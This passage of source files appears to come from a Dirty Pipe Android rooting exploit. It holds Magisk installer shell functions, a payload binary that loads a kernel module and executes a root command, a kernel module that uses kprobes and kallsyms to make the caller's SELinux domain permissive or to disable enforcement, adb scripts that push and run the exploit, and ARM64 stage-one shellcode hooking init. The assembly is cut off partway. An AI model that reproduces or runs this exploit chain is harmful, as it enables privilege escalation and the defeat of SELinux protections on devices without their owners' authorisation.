  unset ANDROID_I18N_ROOT
  unset BOOTCLASSPATH
}

# After calling this method, the following variables will be set:
# KEEPVERITY, KEEPFORCEENCRYPT, RECOVERYMODE, PATCHVBMETAFLAG,
# ISENCRYPTED, VBMETAEXIST
get_flags() {
  getvar KEEPVERITY
  getvar KEEPFORCEENCRYPT
  getvar RECOVERYMODE
  getvar PATCHVBMETAFLAG
  if [ -z $KEEPVERITY ]; then
    if $SYSTEM_ROOT; then
      KEEPVERITY=true
      ui_print "- System-as-root, keep dm/avb-verity"
    else
      KEEPVERITY=false
    fi
  fi
  ISENCRYPTED=false
  grep ' /data ' /proc/mounts | grep -q 'dm-' && ISENCRYPTED=true
  [ "$(getprop ro.crypto.state)" = "encrypted" ] && ISENCRYPTED=true
  if [ -z $KEEPFORCEENCRYPT ]; then
    # No data access means unable to decrypt in recovery
    if $ISENCRYPTED || ! $DATA; then
      KEEPFORCEENCRYPT=true
      ui_print "- Encrypted data, keep forceencrypt"
    else
      KEEPFORCEENCRYPT=false
    fi
  fi
  VBMETAEXIST=false
  local VBMETAIMG=$(find_block vbmeta vbmeta_a)
  [ -n "$VBMETAIMG" ] && VBMETAEXIST=true
  if [ -z $PATCHVBMETAFLAG ]; then
    if $VBMETAEXIST; then
      PATCHVBMETAFLAG=false
    else
      PATCHVBMETAFLAG=true
      ui_print "- Cannot find vbmeta partition, patch vbmeta in boot image"
    fi
  fi
  [ -z $RECOVERYMODE ] && RECOVERYMODE=false
}

find_boot_image() {
  BOOTIMAGE=
  if $RECOVERYMODE; then
    BOOTIMAGE=$(find_block "recovery_ramdisk$SLOT" "recovery$SLOT" "sos")
  elif [ ! -z $SLOT ]; then
    BOOTIMAGE=$(find_block "ramdisk$SLOT" "recovery_ramdisk$SLOT" "init_boot$SLOT" "boot$SLOT")
  else
    BOOTIMAGE=$(find_block ramdisk recovery_ramdisk kern-a android_boot kernel bootimg init_boot boot lnx boot_a)
  fi
  if [ -z $BOOTIMAGE ]; then
    # Lets see what fstabs tells me
    BOOTIMAGE=$(grep -v '#' /etc/*fstab* | grep -E '/boot(img)?[^a-zA-Z]' | grep -oE '/dev/[a-zA-Z0-9_./-]*' | head -n 1)
  fi
}

flash_image() {
  case "$1" in
    *.gz) CMD1="gzip -d < '$1' 2>/dev/null";;
    *)    CMD1="cat '$1'";;
  esac
  if $BOOTSIGNED; then
    CMD2="$BOOTSIGNER -sign"
    ui_print "- Sign image with verity keys"
  else
    CMD2="cat -"
  fi
  if [ -b "$2" ]; then
    local img_sz=$(stat -c '%s' "$1")
    local blk_sz=$(blockdev --getsize64 "$2")
    [ "$img_sz" -gt "$blk_sz" ] && return 1
    blockdev --setrw "$2"
    local blk_ro=$(blockdev --getro "$2")
    [ "$blk_ro" -eq 1 ] && return 2
    eval "$CMD1" | eval "$CMD2" | cat - /dev/zero > "$2" 2>/dev/null
  elif [ -c "$2" ]; then
    flash_eraseall "$2" >&2
    eval "$CMD1" | eval "$CMD2" | nandwrite -p "$2" - >&2
  else
    ui_print "- Not block or char device, storing image"
    eval "$CMD1" | eval "$CMD2" > "$2" 2>/dev/null
  fi
  return 0
}

# Common installation script for flash_script.sh and addon.d.sh
install_magisk() {
  cd $MAGISKBIN

  if [ ! -c $BOOTIMAGE ]; then
    eval $BOOTSIGNER -verify < $BOOTIMAGE && BOOTSIGNED=true
    $BOOTSIGNED && ui_print "- Boot image is signed with AVB 1.0"
  fi

  # Source the boot patcher
  SOURCEDMODE=true
  . ./boot_patch.sh "$BOOTIMAGE"

  ui_print "- Flashing new boot image"
  flash_image new-boot.img "$BOOTIMAGE"
  case $? in
    1)
      abort "! Insufficient partition size"
      ;;
    2)
      abort "! $BOOTIMAGE is read only"
      ;;
  esac

  ./magiskboot cleanup
  rm -f new-boot.img

  run_migrations
}

sign_chromeos() {
  ui_print "- Signing ChromeOS boot image"

  echo > empty
  ./chromeos/futility vbutil_kernel --pack new-boot.img.signed \
  --keyblock ./chromeos/kernel.keyblock --signprivate ./chromeos/kernel_data_key.vbprivk \
  --version 1 --vmlinuz new-boot.img --config empty --arch arm --bootloader empty --flags 0x1

  rm -f empty new-boot.img
  mv new-boot.img.signed new-boot.img
}

remove_system_su() {
  if [ -f /system/bin/su -o -f /system/xbin/su ] && [ ! -f /su/bin/su ]; then
    ui_print "- Removing system installed root"
    blockdev --setrw /dev/block/mapper/system$SLOT 2>/dev/null
    mount -o rw,remount /system
    # SuperSU
    if [ -e /system/bin/.ext/.su ]; then
      mv -f /system/bin/app_process32_original /system/bin/app_process32 2>/dev/null
      mv -f /system/bin/app_process64_original /system/bin/app_process64 2>/dev/null
      mv -f /system/bin/install-recovery_original.sh /system/bin/install-recovery.sh 2>/dev/null
      cd /system/bin
      if [ -e app_process64 ]; then
        ln -sf app_process64 app_process
      elif [ -e app_process32 ]; then
        ln -sf app_process32 app_process
      fi
    fi
    rm -rf /system/.pin /system/bin/.ext /system/etc/.installed_su_daemon /system/etc/.has_su_daemon \
    /system/xbin/daemonsu /system/xbin/su /system/xbin/sugote /system/xbin/sugote-mksh /system/xbin/supolicy \
    /system/bin/app_process_init /system/bin/su /cache/su /system/lib/libsupol.so /system/lib64/libsupol.so \
    /system/su.d /system/etc/install-recovery.sh /system/etc/init.d/99SuperSUDaemon /cache/install-recovery.sh \
    /system/.supersu /cache/.supersu /data/.supersu \
    /system/app/Superuser.apk /system/app/SuperSU /cache/Superuser.apk
  elif [ -f /cache/su.img -o -f /data/su.img -o -d /data/adb/su -o -d /data/su ]; then
    ui_print "- Removing systemless installed root"
    umount -l /su 2>/dev/null
    rm -rf /cache/su.img /data/su.img /data/adb/su /data/adb/suhide /data/su /cache/.supersu /data/.supersu \
    /cache/supersu_install /data/supersu_install
  fi
}

api_level_arch_detect() {
  API=$(grep_get_prop ro.build.version.sdk)
  ABI=$(grep_get_prop ro.product.cpu.abi)
  if [ "$ABI" = "x86" ]; then
    ARCH=x86
    ABI32=x86
    IS64BIT=false
  elif [ "$ABI" = "arm64-v8a" ]; then
    ARCH=arm64
    ABI32=armeabi-v7a
    IS64BIT=true
  elif [ "$ABI" = "x86_64" ]; then
    ARCH=x64
    ABI32=x86
    IS64BIT=true
  else
    ARCH=arm
    ABI=armeabi-v7a
    ABI32=armeabi-v7a
    IS64BIT=false
  fi
}

check_data() {
  DATA=false
  DATA_DE=false
  if grep ' /data ' /proc/mounts | grep -vq 'tmpfs'; then
    # Test if data is writable
    touch /data/.rw && rm /data/.rw && DATA=true
    # Test if data is decrypted
    $DATA && [ -d /data/adb ] && touch /data/adb/.rw && rm /data/adb/.rw && DATA_DE=true
    $DATA_DE && [ -d /data/adb/magisk ] || mkdir /data/adb/magisk || DATA_DE=false
  fi
  NVBASE=/data
  $DATA || NVBASE=/cache/data_adb
  $DATA_DE && NVBASE=/data/adb
  resolve_vars
}

find_magisk_apk() {
  local DBAPK
  [ -z $APK ] && APK=$NVBASE/magisk.apk
  [ -f $APK ] || APK=$MAGISKBIN/magisk.apk
  [ -f $APK ] || APK=/data/app/com.topjohnwu.magisk*/*.apk
  [ -f $APK ] || APK=/data/app/*/com.topjohnwu.magisk*/*.apk
  if [ ! -f $APK ]; then
    DBAPK=$(magisk --sqlite "SELECT value FROM strings WHERE key='requester'" 2>/dev/null | cut -d= -f2)
    [ -z $DBAPK ] && DBAPK=$(strings $NVBASE/magisk.db | grep -oE 'requester..*' | cut -c10-)
    [ -z $DBAPK ] || APK=/data/user_de/*/$DBAPK/dyn/*.apk
    [ -f $APK ] || [ -z $DBAPK ] || APK=/data/app/$DBAPK*/*.apk
    [ -f $APK ] || [ -z $DBAPK ] || APK=/data/app/*/$DBAPK*/*.apk
  fi
  [ -f $APK ] || ui_print "! Unable to detect Magisk app APK for BootSigner"
}

run_migrations() {
  local LOCSHA1
  local TARGET
  # Legacy app installation
  local BACKUP=$MAGISKBIN/stock_boot*.gz
  if [ -f $BACKUP ]; then
    cp $BACKUP /data
    rm -f $BACKUP
  fi

  # Legacy backup
  for gz in /data/stock_boot*.gz; do
    [ -f $gz ] || break
    LOCSHA1=`basename $gz | sed -e 's/stock_boot_//' -e 's/.img.gz//'`
    [ -z $LOCSHA1 ] && break
    mkdir /data/magisk_backup_${LOCSHA1} 2>/dev/null
    mv $gz /data/magisk_backup_${LOCSHA1}/boot.img.gz
  done

  # Stock backups
  LOCSHA1=$SHA1
  for name in boot dtb dtbo dtbs; do
    BACKUP=$MAGISKBIN/stock_${name}.img
    [ -f $BACKUP ] || continue
    if [ $name = 'boot' ]; then
      LOCSHA1=`$MAGISKBIN/magiskboot sha1 $BACKUP`
      mkdir /data/magisk_backup_${LOCSHA1} 2>/dev/null
    fi
    TARGET=/data/magisk_backup_${LOCSHA1}/${name}.img
    cp $BACKUP $TARGET
    rm -f $BACKUP
    gzip -9f $TARGET
  done
}

copy_sepolicy_rules() {
  # Remove all existing rule folders
  rm -rf /data/unencrypted/magisk /cache/magisk /metadata/magisk /persist/magisk /mnt/vendor/persist/magisk

  # Find current active RULESDIR
  local RULESDIR
  local ACTIVEDIR=$(magisk --path)/.magisk/mirror/sepolicy.rules
  if [ -L $ACTIVEDIR ]; then
    RULESDIR=$(readlink $ACTIVEDIR)
    [ "${RULESDIR:0:1}" != "/" ] && RULESDIR="$(magisk --path)/.magisk/mirror/$RULESDIR"
  elif ! $ISENCRYPTED; then
    RULESDIR=$NVBASE/modules
  elif [ -d /data/unencrypted ] && ! grep ' /data ' /proc/mounts | grep -qE 'dm-|f2fs'; then
    RULESDIR=/data/unencrypted/magisk
  elif grep ' /cache ' /proc/mounts | grep -q 'ext4' ; then
    RULESDIR=/cache/magisk
  elif grep ' /metadata ' /proc/mounts | grep -q 'ext4' ; then
    RULESDIR=/metadata/magisk
  elif grep ' /persist ' /proc/mounts | grep -q 'ext4' ; then
    RULESDIR=/persist/magisk
  elif grep ' /mnt/vendor/persist ' /proc/mounts | grep -q 'ext4' ; then
    RULESDIR=/mnt/vendor/persist/magisk
  else
    ui_print "- Unable to find sepolicy rules dir"
    return 1
  fi

  if [ -d ${RULESDIR%/magisk} ]; then
    ui_print "- Sepolicy rules dir is ${RULESDIR%/magisk}"
  else
    ui_print "- Sepolicy rules dir ${RULESDIR%/magisk} not found"
    return 1
  fi

  # Copy all enabled sepolicy.rule
  for r in $NVBASE/modules*/*/sepolicy.rule; do
    [ -f "$r" ] || continue
    local MODDIR=${r%/*}
    [ -f $MODDIR/disable ] && continue
    [ -f $MODDIR/remove ] && continue
    local MODNAME=${MODDIR##*/}
    mkdir -p $RULESDIR/$MODNAME
    cp -f $r $RULESDIR/$MODNAME/sepolicy.rule
  done
}

#################
# Module Related
#################

set_perm() {
  chown $2:$3 $1 || return 1
  chmod $4 $1 || return 1
  local CON=$5
  [ -z $CON ] && CON=u:object_r:system_file:s0
  chcon $CON $1 || return 1
}

set_perm_recursive() {
  find $1 -type d 2>/dev/null | while read dir; do
    set_perm $dir $2 $3 $4 $6
  done
  find $1 -type f -o -type l 2>/dev/null | while read file; do
    set_perm $file $2 $3 $5 $6
  done
}

mktouch() {
  mkdir -p ${1%/*} 2>/dev/null
  [ -z $2 ] && touch $1 || echo $2 > $1
  chmod 644 $1
}

request_size_check() {
  reqSizeM=`du -ms "$1" | cut -f1`
}

request_zip_size_check() {
  reqSizeM=`unzip -l "$1" | tail -n 1 | awk '{ print int(($1 - 1) / 1048576 + 1) }'`
}

boot_actions() { return; }

# Require ZIPFILE to be set
is_legacy_script() {
  unzip -l "$ZIPFILE" install.sh | grep -q install.sh
  return $?
}

# Require OUTFD, ZIPFILE to be set
install_module() {
  rm -rf $TMPDIR
  mkdir -p $TMPDIR
  cd $TMPDIR

  setup_flashable
  mount_partitions
  api_level_arch_detect

  # Setup busybox and binaries
  if $BOOTMODE; then
    boot_actions
  else
    recovery_actions
  fi

  # Extract prop file
  unzip -o "$ZIPFILE" module.prop -d $TMPDIR >&2
  [ ! -f $TMPDIR/module.prop ] && abort "! Unable to extract zip file!"

  local MODDIRNAME=modules
  $BOOTMODE && MODDIRNAME=modules_update
  local MODULEROOT=$NVBASE/$MODDIRNAME
  MODID=`grep_prop id $TMPDIR/module.prop`
  MODNAME=`grep_prop name $TMPDIR/module.prop`
  MODAUTH=`grep_prop author $TMPDIR/module.prop`
  MODPATH=$MODULEROOT/$MODID

  # Create mod paths
  rm -rf $MODPATH
  mkdir -p $MODPATH

  if is_legacy_script; then
    unzip -oj "$ZIPFILE" module.prop install.sh uninstall.sh 'common/*' -d $TMPDIR >&2

    # Load install script
    . $TMPDIR/install.sh

    # Callbacks
    print_modname
    on_install

    [ -f $TMPDIR/uninstall.sh ] && cp -af $TMPDIR/uninstall.sh $MODPATH/uninstall.sh
    $SKIPMOUNT && touch $MODPATH/skip_mount
    $PROPFILE && cp -af $TMPDIR/system.prop $MODPATH/system.prop
    cp -af $TMPDIR/module.prop $MODPATH/module.prop
    $POSTFSDATA && cp -af $TMPDIR/post-fs-data.sh $MODPATH/post-fs-data.sh
    $LATESTARTSERVICE && cp -af $TMPDIR/service.sh $MODPATH/service.sh

    ui_print "- Setting permissions"
    set_permissions
  else
    print_title "$MODNAME" "by $MODAUTH"
    print_title "Powered by Magisk"

    unzip -o "$ZIPFILE" customize.sh -d $MODPATH >&2

    if ! grep -q '^SKIPUNZIP=1$' $MODPATH/customize.sh 2>/dev/null; then
      ui_print "- Extracting module files"
      unzip -o "$ZIPFILE" -x 'META-INF/*' -d $MODPATH >&2

      # Default permissions
      set_perm_recursive $MODPATH 0 0 0755 0644
      set_perm_recursive $MODPATH/system/bin 0 2000 0755 0755
      set_perm_recursive $MODPATH/system/xbin 0 2000 0755 0755
      set_perm_recursive $MODPATH/system/system_ext/bin 0 2000 0755 0755
      set_perm_recursive $MODPATH/system/vendor/bin 0 2000 0755 0755 u:object_r:vendor_file:s0
    fi

    # Load customization script
    [ -f $MODPATH/customize.sh ] && . $MODPATH/customize.sh
  fi

  # Handle replace folders
  for TARGET in $REPLACE; do
    ui_print "- Replace target: $TARGET"
    mktouch $MODPATH$TARGET/.replace
  done

  if $BOOTMODE; then
    # Update info for Magisk app
    mktouch $NVBASE/modules/$MODID/update
    rm -rf $NVBASE/modules/$MODID/remove 2>/dev/null
    rm -rf $NVBASE/modules/$MODID/disable 2>/dev/null
    cp -af $MODPATH/module.prop $NVBASE/modules/$MODID/module.prop
  fi

  # Copy over custom sepolicy rules
  if [ -f $MODPATH/sepolicy.rule ]; then
    ui_print "- Installing custom sepolicy rules"
    copy_sepolicy_rules
  fi

  # Remove stuff that doesn't belong to modules and clean up any empty directories
  rm -rf \
  $MODPATH/system/placeholder $MODPATH/customize.sh \
  $MODPATH/README.md $MODPATH/.git*
  rmdir -p $MODPATH

  cd /
  $BOOTMODE || recovery_cleanup
  rm -rf $TMPDIR

  ui_print "- Done"
}

##########
# Presets
##########

# Detect whether in boot mode
[ -z $BOOTMODE ] && ps | grep zygote | grep -qv grep && BOOTMODE=true
[ -z $BOOTMODE ] && ps -A 2>/dev/null | grep zygote | grep -qv grep && BOOTMODE=true
[ -z $BOOTMODE ] && BOOTMODE=false

NVBASE=/data/adb
TMPDIR=/dev/tmp

# Bootsigner related stuff
BOOTSIGNERCLASS=com.topjohnwu.signing.SignBoot
BOOTSIGNER='/system/bin/dalvikvm -Xnoimage-dex2oat -cp $APK $BOOTSIGNERCLASS'
BOOTSIGNED=false

resolve_vars

```

`modprobe-payload.c`:

```c
#define _GNU_SOURCE
#include <unistd.h>
#include <dlfcn.h>
#include <ctype.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <errno.h>
#include <android/log.h>
#include <sys/syscall.h>
#include <linux/module.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "modprobe-payload", __VA_ARGS__); }

int _start() {
	//const char *lib_mod = "/vendor/lib/libstagefright_soft_mp3dec.so";
	// Parse cmdline
	int fd_c = open("/proc/self/cmdline", O_RDONLY);
	char cmdline[1000];
	int r = read(fd_c, cmdline, sizeof(cmdline) - 1);
	if(r <= 0){
		LOGV("F: cmdline.");
		exit(1);
	}
	close(fd_c);

	cmdline[r] = 0;
	int path_len = strlen(cmdline);
	if(path_len >= r - 1){
		LOGV("F: Parse 1: %d r=%d %s", path_len, r, cmdline);
		exit(1);
	}
	const char *lib_mod = cmdline + path_len + 1;
	int fd = open(lib_mod, O_RDONLY);

	const char *root_cmd = lib_mod + strlen(lib_mod) + 1;
	if(root_cmd - cmdline >= r - 1){
		LOGV("Parse: %d %d", root_cmd - cmdline, r - 1);
		exit(1);
	}

	LOGV("Parsed '%s' '%s' fd=%d\n", lib_mod, root_cmd, fd);

#if MODPROBE_DEBUG == 1
	if(lseek64(fd, 0x1000, SEEK_SET) < 0){
		LOGV("Failed to lseek\n");
	}
	char buf2[1000];
	if(read(fd, buf2, sizeof(buf2)) < 0){
		LOGV("Failed to read\n");
	}
	LOGV("Content: %02hhx %02hhx %02hhx %02hhx %02hhx %02hhx %02hhx %02hhx\n", buf2[0], buf2[1], buf2[2], buf2[3], buf2[4], buf2[5], buf2[6], buf2[7]);

	exit(2);
#endif

	int ret = syscall(__NR_finit_module, fd, "", 0);
	if(ret == 0 || errno == ENOMSG){
		// finit_module failed with:
		// EPERM 1: Not root or not has CAP_SYS_MODULE capability.
		// ENOEXEC 8: bad module file
		// EACCES 13: denied by selinux policy. current domain has no load_module permission.
		// EFAULT 14: module was loaded but something wrong on modifying selinux policy.
		// ENOMSG 42: ok. mymod returns ENOMSG even if succeed to load.
		LOGV("Succeed: %s %d %d\n", lib_mod, ret, errno);
	}else{
		LOGV("Failed: %s %d %d\n", lib_mod, ret, errno);
	}
	close(fd);

	// If succeed to load module, we now on a permissive domain.

	int p[2];
	syscall(__NR_pipe2, p, O_CLOEXEC);

	int fdnull = open("/dev/null", O_RDWR);
	syscall(__NR_dup3, fdnull, 0, 0);
	syscall(__NR_dup3, fdnull, 1, 0);
	syscall(__NR_dup3, fdnull, 2, 0);

	if(fork() == 0){
		for(int i = 0; i < 100; i++){
			execve(root_cmd, 0, 0);
			LOGV("execve: %d %s %d\n", errno, root_cmd, i);
			sleep(1);
		}
		exit(2);
		return 0;
	}
	close(p[1]);
	char buf;
	// Wait for execve() of child. This should wait for close-on-exec on pipe.
	// If we don't wait execve(), stage2 will overwrite (restore) the content of /vendor/bin/modprobe.
	// This will crash the child process.
	read(p[0], &buf, 1);

	exit(ret);
}

```

`mymod/Makefile`:

```
obj-$(CONFIG_MYMOD)		+= mymod.o

KERNEL_SRC ?= /lib/modules/$(shell uname -r)/build
M ?= $(shell pwd)
KERNEL_UAPI_HEADERS_DIR ?= $(shell readlink -m ${COMMON_OUT_DIR}/kernel_uapi_headers)
KBUILD_OPTIONS += CONFIG_MYMOD=m

modules clean modules_install:
	$(MAKE) -C $(KERNEL_SRC) M=$(M) \
	$(KBUILD_OPTIONS) \
	EXTRA_CFLAGS="$(EXTRA_CFLAGS)" \
	$(@)


```

`mymod/build-script-patch.patch`:

```patch
diff --git a/build.config.slider b/build.config.slider
index 595b8d75d11a..887437feef49 100644
--- a/build.config.slider
+++ b/build.config.slider
@@ -9,6 +9,9 @@ google/gs101-dpm-eng.dtbo
 google/gs101-dpm-user.dtbo
 google/gs101-dpm-userdebug.dtbo
 "
+MAKE_GOALS="
+modules
+"
 
 FILES="
 arch/arm64/boot/dts/google/gs101-a0.dtb
@@ -18,12 +21,14 @@ arch/arm64/boot/dts/google/gs101-dpm-eng.dtbo
 arch/arm64/boot/dts/google/gs101-dpm-user.dtbo
 arch/arm64/boot/dts/google/gs101-dpm-userdebug.dtbo
 "
-
-if [ -z "$MIXED_BUILD" ]; then
-FILES="$FILES
-$DEVICE_KERNEL_FILES
+FILES="
 "
-fi
+
+#if [ -z "$MIXED_BUILD" ]; then
+#FILES="$FILES
+#$DEVICE_KERNEL_FILES
+#"
+#fi
 
 MODULES_LIST=${KERNEL_DIR}/vendor_boot_modules.slider
 
@@ -58,3 +63,6 @@ private/google-modules/power/reset
 private/google-modules/bluetooth/broadcom
 private/google-modules/nfc
 "
+EXT_MODULES="
+private/google-modules/mymod
+"

```

`mymod/mymod.c`:

```c
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/seq_file.h>
#include <linux/kallsyms.h>
#include <linux/ftrace.h>
#include <linux/version.h>
#include <linux/skbuff.h>
#include <linux/types.h>
#include <linux/cred.h>
#include <net/inet_sock.h>
#include <linux/securebits.h>
#include <linux/user_namespace.h>
#include <linux/prctl.h>
#include <linux/security.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/lsm_hooks.h>
#include <linux/rcupdate.h>

struct ebitmap;

// Dummy
struct policydb {};

struct selinux_policy {
	struct sidtab *sidtab;
	// only need offset of policydb
	struct policydb policydb;
	//struct selinux_map map;
	//u32 latest_granting;
} __randomize_layout;

#define __POLICYDB_CAPABILITY_MAX 7
struct selinux_state {
#ifdef CONFIG_SECURITY_SELINUX_DISABLE
	bool disabled;
#endif
#ifdef CONFIG_SECURITY_SELINUX_DEVELOP
	bool enforcing;
#endif
	bool checkreqprot;
	bool initialized;
	bool policycap[__POLICYDB_CAPABILITY_MAX];
	bool android_netlink_route;
	bool android_netlink_getneigh;

	struct page *status_page;
	struct mutex status_lock;

	struct selinux_avc *avc;
	struct selinux_policy __rcu *policy;
	struct mutex policy_mutex;
} __randomize_layout;

struct task_security_struct {
	u32 osid;		/* SID prior to last execve */
	u32 sid;		/* current SID */
	u32 exec_sid;		/* exec SID */
	u32 create_sid;		/* fscreate SID */
	u32 keycreate_sid;	/* keycreate SID */
	u32 sockcreate_sid;	/* fscreate SID */
} __randomize_layout;

struct context {
	u32 user;
	u32 role;
	u32 type;
	u32 len;        /* length of string in bytes */
	//struct mls_range range;
	char range[48];
	char *str;	/* string representation if context cannot be mapped. */
};

struct sidtab_entry {
	u32 sid;
	u32 hash;
	struct context context;
#if CONFIG_SECURITY_SELINUX_SID2STR_CACHE_SIZE > 0
	struct sidtab_str_cache __rcu *cache;
#endif
	struct hlist_node list;
};

static int __init mymod_init(void) {
	
	int rc = 0;
	struct selinux_state *selinux_state_ = NULL;

	pr_info("mymod_init: called!\n");

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	
	kallsyms_lookup_name_t kallsyms_lookup_name = NULL;
	
	static struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name"
	};
	rc = register_kprobe(&kp);
	if(rc < 0) {
		pr_info("mymod_init: register_kprobe failed: %d\n", rc);
		return rc;
	}
	pr_info("mymod_init: register_kprobe: %d\n", rc);

	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);
#endif
	selinux_state_ = (typeof(selinux_state_))kallsyms_lookup_name("selinux_state");
	// if not found, exit with `Bad address`
	if(selinux_state_ == NULL) {
		pr_info("mymod_init: real_selinux_state == NULL\n");
		return -EFAULT;
	}
#define USE_PERMISSIVE_DOMAIN
#ifdef USE_PERMISSIVE_DOMAIN
	int (*ebitmap_set_bit_)(struct ebitmap *e, unsigned long bit, int value) = NULL;
	struct sidtab_entry *(*sidtab_search_entry_)(struct sidtab *s, u32 sid) = NULL;
	struct lsm_blob_sizes *selinux_blob_sizes_ = NULL;
	
	selinux_blob_sizes_ = (typeof(selinux_blob_sizes_))kallsyms_lookup_name("selinux_blob_sizes");
	if(selinux_blob_sizes_ == NULL){
		pr_info("mymod_init: selinux_blob_sizes = NULL");
	}else{
		// Set context of current process (u:r:vendor_modprobe:s0) to permissive.
		// Current process refers the process that is calling finit_module.
		const struct cred *cred = current->cred;
		if(cred == NULL){
			pr_info("mymod_init: cred == NULL");
			return -EFAULT;
		}
		if(cred->security == NULL){
			pr_info("mymod_init: cred->security == NULL");
			return -EFAULT;
		}
		ebitmap_set_bit_ = (typeof(ebitmap_set_bit_))kallsyms_lookup_name("ebitmap_set_bit");
		if(ebitmap_set_bit_ == NULL){
			pr_info("mymod_init: ebitmap_set_bit_ == NULL");
			return -EFAULT;
		}
		sidtab_search_entry_ = (typeof(sidtab_search_entry_))kallsyms_lookup_name("sidtab_search_entry");
		if(sidtab_search_entry_ == NULL){
			pr_info("mymod_init: sidtab_search_entry_ == NULL");
			return -EFAULT;
		}
		struct task_security_struct *tsec = cred->security + selinux_blob_sizes_->lbs_cred;
		pr_info("mymod_init: Set current sid (%d) to permissive.", tsec->sid);

		rcu_read_lock();
		struct selinux_policy *policy = rcu_dereference(selinux_state_->policy);

		struct sidtab_entry *entry = sidtab_search_entry_(policy->sidtab, tsec->sid);
		if(entry == NULL){
			pr_info("mymod_init: entry == NULL");
			rcu_read_unlock();
			return -EFAULT;
		}
		struct ebitmap *permissive = (struct ebitmap *)(((char*)&policy->policydb) + 560);
		ebitmap_set_bit_(permissive, entry->context.type, 1);

		rcu_read_unlock();
	}
#else
	// It will set whole system permissive. A bit unsecure, I think.
	pr_info("mymod_init: Setting selinux_state.enforcing=false. %lx %lx\n", (unsigned long)selinux_state_,
			(unsigned long)&selinux_state_->enforcing);
	bool enforcing_status = READ_ONCE(selinux_state_->enforcing);
	pr_info("mymod_init: Current value of selinux_state.enforcing=%d\n", enforcing_status);
	WRITE_ONCE(selinux_state_->enforcing, false);
	enforcing_status = READ_ONCE(selinux_state_->enforcing);
	pr_info("mymod_init: New value of selinux_state.enforcing=%d\n", enforcing_status);
#endif

	//int (*security_context_to_sid_)(struct selinux_state *state,
	//		    const char *scontext, u32 scontext_len,
	//		    u32 *out_sid, gfp_t gfp) = NULL;
	// It won't work because update_engine (permissive domain) doesn't exist before magisk policy patch.
	//security_context_to_sid_ = (typeof(security_context_to_sid_))kallsyms_lookup_name("security_context_to_sid");
	//rc = security_context_to_sid_(selinux_state_, "update_engine", strlen("update_engine"),
	//		&sid, GFP_KERNEL);
	//if(rc != 0){
	//	pr_info("mymod_init: failed to security_context_to_sid\n");
	//	return -ENOENT;
	//}else{
	//	struct cred *new;

	//	if(selinux_blob_sizes_ == NULL){
	//		pr_info("mymod_init: selinux_blob_sizes = NULL");
	//	}else{
	//		pr_info("mymod_init: Change sid %d", sid);
	//		struct task_security_struct *tsec = new->security + selinux_blob_sizes_->lbs_cred;
	//		tsec->sid = sid;
	//	}
	//}

	return -ENOMSG;
}


static void __exit mymod_exit(void)
{
	pr_info("mymod_exit: end\n");
}
module_init(mymod_init);
module_exit(mymod_exit);

MODULE_LICENSE("GPL v2");
__asm__(".space 32, 0\n");


```

`release.sh`:

```sh
#!/bin/sh
set -e

version=$1
dname="dirtypipe-android-$1"
dir="dist/$dname"

mkdir dist/ || true
mkdir "$dir"

cp dirtypipe-android env-patcher startup-root run.sh run.bat "$dir"

mkdir "$dir"/magisk
for i in magisk busybox magiskboot magiskinit util_functions.sh boot_patch.sh; do
    cp magisk/$i "$dir"/magisk/
done
cp magisk/Magisk-v24.3.apk "$dir"/magisk/

cd dist/
zip -r "$dname".zip "$dname"


```

`run.bat`:

```bat
@echo off

set dir=/data/local/tmp
set adb=adb -d

%adb% push dirtypipe-android env-patcher startup-root magisk/ %dir%
%adb% shell chmod 755 %dir%/dirtypipe-android %dir%/env-patcher %dir%/startup-root %dir%/magisk/busybox %dir%/magisk/magiskinit
%adb% shell %dir%/dirtypipe-android

pause


```

`run.sh`:

```sh
#!/bin/sh
set -e

dir=/data/local/tmp
adb=${adb:-"adb"}

$adb push dirtypipe-android env-patcher startup-root magisk/ ${dir}
$adb shell chmod 755 ${dir}/dirtypipe-android ${dir}/env-patcher ${dir}/startup-root ${dir}/magisk/busybox ${dir}/magisk/magiskinit
$adb shell ${dir}/dirtypipe-android


```

`stage1.S`:

```S
    .arch armv8-a

    .include "include.inc"

    .global stage1_start
    .global stage1_filename
    .global stage1_data
    .global stage1_len
    .global stage1_stage2_libname
    .global stage1_first_inst_copy
    .data


stage1_data:

stage1_filename:
L_filename:
    .asciz "/dev/.dirtypipe-0000"
stage1_stage2_libname:
lib:
    .space 64, 0
    //.asciz "/system/lib/libldacBT_enc.so"

    .balign 4

stage1_start:
    stp x0, x1, [sp, #-16]!
    stp x2, x3, [sp, #-16]!
    stp x4, x5, [sp, #-16]!
    stp x6, x7, [sp, #-16]!
    stp x8, x9, [sp, #-16]!
    stp x26, x27, [sp, #-16]!
    stp x28, x29, [sp, #-16]!
    str x30, [sp, #-16]!

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0

    cbnz    w0, return

    // Detect init pid = 1
    mov     x8, SYS_getpid
    svc     0

    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    /* call openat(0, filename, O_CREAT|O_EXCL, 0) */
    mov     x0, #0
    // Must pass L_filename. If put stage1_filename, address is not determined until link time.
    adr     x1, L_filename
    mov     x2, O_CREAT|O_EXCL
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    sub     sp, sp, 16

    // syscall(SYS_gettid);
    mov     x8, SYS_gettid
    svc     0
    str     w0, [sp, 8]

    // clone(CLONE_CHILD_SETTID   | 
    //       CLONE_CHILD_CLEARTID | 
    //       SIGCHLD, 0, NULL, NULL, &ctid)
    mov     x8, SYS_clone
    add     x4, sp, 8           // ctid
    mov     x3, xzr              // newtls
    mov     x2, xzr              // ptid
    mov     x1, xzr // stack
    movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
    svc     0
